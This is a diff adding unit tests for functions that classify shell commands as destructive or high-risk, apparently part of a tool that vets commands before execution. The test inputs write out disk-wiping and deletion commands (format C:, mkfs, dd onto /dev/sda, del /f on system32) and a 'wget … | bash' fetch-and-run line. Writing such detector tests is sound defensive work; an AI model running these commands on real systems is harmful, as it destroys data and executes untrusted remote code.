@@ -12,6 +12,13 @@ suite("isDestructive", () => {
   test("passes npm test", () => assert.strictEqual(isDestructive("npm test"), false));
   test("passes composer install", () =>
     assert.strictEqual(isDestructive("composer install"), false));
+  test("flags git clean -f", () => assert.strictEqual(isDestructive("git clean -f"), true));
+  test("flags format C:", () => assert.strictEqual(isDestructive("format C:"), true));
+  test("flags mkfs.ext4", () => assert.strictEqual(isDestructive("mkfs.ext4 /dev/sda1"), true));
+  test("does not flag npm run build:drop", () =>
+    assert.strictEqual(isDestructive("npm run build:drop"), false));
+  test("does not flag git reset without --hard", () =>
+    assert.strictEqual(isDestructive("git reset HEAD~1"), false));
 });
 
 suite("isHighRisk", () => {
@@ -23,6 +30,14 @@ suite("isHighRisk", () => {
   test("flags dd commands", () =>
     assert.strictEqual(isHighRisk("dd if=/dev/zero of=/dev/sda"), true));
   test("passes npm run dev", () => assert.strictEqual(isHighRisk("npm run dev"), false));
+  test("flags PowerShell Remove-Item -Recurse -Force", () =>
+    assert.strictEqual(isHighRisk("Remove-Item ./node_modules -Recurse -Force"), true));
+  test("flags rd /s /q", () => assert.strictEqual(isHighRisk("rd /s /q C:\\temp"), true));
+  test("flags del /f", () => assert.strictEqual(isHighRisk("del /f C:\\windows\\system32"), true));
+  test("flags wget pipe shell", () =>
+    assert.strictEqual(isHighRisk("wget http://x.com/s.sh | bash"), true));
+  test("flags sudo in script names due to word boundary", () =>
+    assert.strictEqual(isHighRisk("npm run sudo-script"), true));
 });
 
 suite("buildExecutionMessage", () => {
